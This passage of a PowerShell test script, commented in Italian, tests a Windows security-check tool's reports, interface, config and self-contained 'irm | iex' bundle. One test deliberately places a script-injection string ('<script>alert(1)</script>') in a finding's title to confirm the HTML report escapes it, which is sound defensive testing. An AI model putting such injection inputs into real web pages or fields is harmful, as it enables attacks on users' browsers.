Assert 'Testi brevi: nessun titolo o consiglio oltre 220 caratteri' { if ($long.Count) { $long | ForEach-Object { Write-Host "      troppo lungo: $($_.Substring(0, 60))..." -ForegroundColor DarkYellow } }; $long.Count -eq 0 }
Assert 'Niente gergo inglese nei testi (infostealer, fileless, man-in-the-browser)' { @($texts | Where-Object { $_ -match '(?i)infostealer|fileless|man-in-the-browser|dump della memoria' }).Count -eq 0 }
$ui = [IO.File]::ReadAllText((Join-Path (Join-Path (Split-Path $here -Parent) 'ui') 'index.html'))
Assert 'Interfaccia senza risorse esterne' { $ui -notmatch '(?i)(src|href)\s*=\s*"https?:' -and $ui -notmatch '(?i)@import|url\(\s*["'']?https?:' }
Assert 'Interfaccia con le stesse etichette del rapporto' { $ui -like '*CONFERMATO*' -and $ui -like '*DA CONTROLLARE*' -and $ui -like '*DA CORREGGERE*' -and $ui -like '*DETTAGLIO*' }
Assert 'Interfaccia con CSP (nonce) per gli script' { $ui -like '*nonce="__NONCE__"*' }
$cj = Read-JsonFile (Join-Path (Join-Path (Split-Path $here -Parent) 'config') 'config.json')
Assert 'config.json valido con il dominio della banca' { $null -ne $cj -and @(ConvertTo-StrArray $cj['BankDomains']) -contains 'relaxbanking.it' }

Write-Host "`n== Report HTML ==" -ForegroundColor Cyan
$script:Findings.Clear()
$hEmpty = Join-Path $tmp 'vuoto.html'
Write-HtmlReport $hEmpty
$hte = [IO.File]::ReadAllText($hEmpty)
Assert 'Report di PC pulito: "Nessun problema trovato" e guida alla lettura' { $hte -like '*Nessun problema trovato.*' -and $hte -like '*Come leggere il rapporto*' -and $hte -like '*Nessun segno di attacco trovato.*' }
Assert 'Report senza risorse esterne' { $hte -notmatch '(?i)(src|href)\s*=\s*"https?:' }
Add-Finding 'ALTA' 'Test' 'Titolo <script>alert(1)</script>' 'dettaglio & "virgolette"' 'consiglio'
$html = Join-Path $tmp 'r.html'
Write-HtmlReport $html
$ht = [IO.File]::ReadAllText($html)
Assert 'Report HTML creato con punteggio' { $ht -like '*<!doctype html>*' -and $ht -like '*ALTA*' -and $ht -like '*su 100*' }
Assert 'Report: problema mostrato come CONFERMATO' { $ht -like '*>CONFERMATO</span>*' }
Assert 'Testo nel report correttamente codificato (niente HTML iniettato)' { $ht -notlike '*<script>alert(1)*' -and $ht -like '*&lt;script&gt;*' }

if (-not $SkipFullRun) {
    Write-Host "`n== Esecuzione completa (Raccolta) ==" -ForegroundColor Cyan
    $out = Join-Path $tmp 'out'
    New-Item -ItemType Directory -Path $out | Out-Null
    $psExe = (Get-Process -Id $PID).Path
    & $psExe -NoProfile -ExecutionPolicy Bypass -File $main -Mode Raccolta -OutputPath $out -NoOpen -NoZip *> (Join-Path $tmp 'run1.txt')
    $d1 = @(Get-ChildItem -LiteralPath $out -Directory)
    Assert 'Prima esecuzione: cartella report creata' { $d1.Count -eq 1 }
    Assert 'Prima esecuzione: REPORT.html, risultati.json, SHA256SUMS.txt, snapshot.json' { (Test-Path (Join-Path $d1[0].FullName 'risultati.json')) -and (Test-Path (Join-Path $d1[0].FullName 'REPORT.html')) -and (Test-Path (Join-Path $d1[0].FullName 'SHA256SUMS.txt')) -and (Test-Path (Join-Path $d1[0].FullName 'snapshot.json')) }
    Assert 'risultati.json valido con punteggio' { $j = Get-Content -Raw (Join-Path $d1[0].FullName 'risultati.json') | ConvertFrom-Json; $j.App -eq 'CyberRSecurityCheck' -and $j.Punteggio -ge 0 -and $j.Punteggio -le 100 }
    Assert 'Tutti i controlli eseguiti (24)' { $j = Get-Content -Raw (Join-Path $d1[0].FullName 'risultati.json') | ConvertFrom-Json; @($j.Controlli).Count -ge 24 }
    Assert 'SHA256SUMS corretti' {
        $okAll = $true
        foreach ($l in (Get-Content (Join-Path $d1[0].FullName 'SHA256SUMS.txt') | Where-Object { $_ -notlike '#*' })) {
            $h, $n = $l -split '  ', 2
            if ((Get-FileHash -LiteralPath (Join-Path $d1[0].FullName $n) -Algorithm SHA256).Hash -ne $h) { $okAll = $false }
        }
        $okAll
    }
    Start-Sleep -Seconds 1
    & $psExe -NoProfile -ExecutionPolicy Bypass -File $main -Mode Raccolta -OutputPath $out -NoOpen -NoZip *> (Join-Path $tmp 'run2.txt')
    $d2 = @(Get-ChildItem -LiteralPath $out -Directory | Sort-Object Name)
    Assert 'Seconda esecuzione: confronto con la precedente presente nel report' { $d2.Count -eq 2 -and ([IO.File]::ReadAllText((Join-Path $d2[1].FullName 'REPORT.html')) -match 'Nessuna differenza|NUOVO dall|elementi rimossi|Confronto con analisi') }
}

$bundle = Join-Path (Split-Path $here -Parent) 'cyberrsecuritycheck.ps1'
if (Test-Path -LiteralPath $bundle) {
    Write-Host "`n== File unico (irm | iex) ==" -ForegroundColor Cyan
    $bytes = [IO.File]::ReadAllBytes($bundle)
    Assert 'File unico senza BOM' { -not ($bytes.Length -ge 3 -and $bytes[0] -eq 0xEF -and $bytes[1] -eq 0xBB -and $bytes[2] -eq 0xBF) }
    Assert 'File unico solo ASCII' { @($bytes | Where-Object { $_ -gt 127 }).Count -eq 0 }
    Assert 'Lanciatore senza break (uscirebbe anche dallo script di chi lo avvia)' {
        $launcher = ([IO.File]::ReadAllText($bundle) -split 'function ConvertFrom-CrsBlob')[0]
        $lt = $null; $le = $null
        $ast = [System.Management.Automation.Language.Parser]::ParseInput($launcher, [ref]$lt, [ref]$le)
        @($ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.BreakStatementAst] }, $true)).Count -eq 0
    }
    Assert 'File unico con sintassi valida' { $t = $null; $e = $null; [void][System.Management.Automation.Language.Parser]::ParseFile($bundle, [ref]$t, [ref]$e); $e.Count -eq 0 }
    Assert 'Impronta SHA256 pubblicata corretta' {
        $sf = "$bundle.sha256"
        (Test-Path -LiteralPath $sf) -and ((Get-Content -LiteralPath $sf -Raw).Split(' ')[0].Trim() -eq (Get-FileHash -LiteralPath $bundle -Algorithm SHA256).Hash.ToLowerInvariant())
    }
    $psExe = (Get-Process -Id $PID).Path
    $sim = "`$env:CRS_SELFTEST='1'; `$env:CRS_NO_ELEVATE='1'; Get-Content -Raw -LiteralPath '$($bundle -replace "'", "''")' | Invoke-Expression"
    $selfOut = (& $psExe -NoProfile -ExecutionPolicy Bypass -Command $sim 2>&1 | Out-String)
    Assert 'Avvio come "irm | iex": componenti estratti e validi' { $selfOut -match 'SELFTEST OK' }
    if (-not $SkipFullRun) {
        $bout = Join-Path $tmp 'bundle_out'
        $run = "`$env:CRS_NO_ELEVATE='1'; & ([ScriptBlock]::Create((Get-Content -Raw -LiteralPath '$($bundle -replace "'", "''")'))) -Console -Mode Raccolta -OutputPath '$($bout -replace "'", "''")'"
        & $psExe -NoProfile -ExecutionPolicy Bypass -Command $run *> (Join-Path $tmp 'bundle_run.txt')
        $bd = @(Get-ChildItem -LiteralPath $bout -Directory -ErrorAction SilentlyContinue)
        Assert 'File unico: analisi da console completata con rapporto' { $bd.Count -eq 1 -and (Test-Path (Join-Path $bd[0].FullName 'REPORT.html')) -and (Test-Path (Join-Path $bd[0].FullName 'risultati.json')) }
    }
}

Remove-Item -LiteralPath $tmp -Recurse -Force -ErrorAction SilentlyContinue
Write-Host ''
$col = 'Green'; if ($script:fail) { $col = 'Red' }
Write-Host ("Test superati: {0}   falliti: {1}" -f $script:pass, $script:fail) -ForegroundColor $col
if ($script:fail) { exit 1 } else { exit 0 }
